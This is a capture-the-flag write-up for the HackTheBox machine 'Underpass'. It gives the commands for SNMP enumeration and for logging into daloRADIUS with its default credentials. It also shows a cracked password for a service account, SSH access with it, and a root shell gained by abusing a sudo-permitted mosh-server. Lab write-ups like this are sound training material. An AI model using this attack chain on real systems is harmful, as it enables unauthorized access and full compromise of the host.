---
title: Underpass
date: 2024-12-28
description: Enumerated SNMP to uncover daloRADIUS exposure, leveraged default credentials to access the management panel, extracted user credentials, and escalated privileges through `mosh-server` misconfiguration to gain root access.
tags:
  - htb
  - Easy
  - Linux
---

# Intial Recon
## SNMP Enumeration

A UDP scan exposed the `snmp` service.

Enumerated the service using `snmpwalk`.

```
snmpwalk -v2c -c public <ip>
```

From the retrieved output:

```output
steve@underpass.htb

UnDerPass.htb is the only daloradius server in the basin!
```

That confirmed a `daloRADIUS` instance was running on the target.


# User

## daloRADIUS Access

Checked the public GitHub repositories related to `daloRADIUS` and identified the operator login panel:

`/app/operators/login.php`

Accessed:

```
http://10.10.11.48/daloradius/app/operators/login.php
```

Tried the default credentials found online:

```text
administrator:radius
```

The login worked. Straight into the management panel like nobody bothered changing the defaults. Classic.

Under the user listing section, the following credentials were exposed:

```text
svcMosh
412DD4759978ACFCC81DEAB01B382403 → underwaterfriends
```

---

## SSH Access

Captured access through SSH as `svcMosh`.

```console
ssh svcMosh@underpass.htb
```

---

# Root
## Privilege Escalation

Checked sudo permissions:

```console
sudo -l
```

`mosh-server` could be executed with root privileges.

After reviewing the documentation, it became clear that establishing a connection through `mosh-server` would provide an interactive session tied to the privileged process.

Started the server:

```console
sudo /usr/bin/mosh-server
```

Output:

```output
MOSH CONNECT 60001 Kyd4A9M6Ag7+pJNiYqnqFg
```

The command returned a connection key and port.

Established a new session:

```console
sudo /usr/bin/mosh-server new
```

Another connection token was generated:

```output
MOSH CONNECT 60001 D++HpD2vzBFz5b2QVdM8+Q
```

Connected to the session using:

```console
MOSH_KEY=D++HpD2vzBFz5b2QVdM8+Q mosh-client 0.0.0.0 60001
```

The session spawned a root shell.

Gained `root`
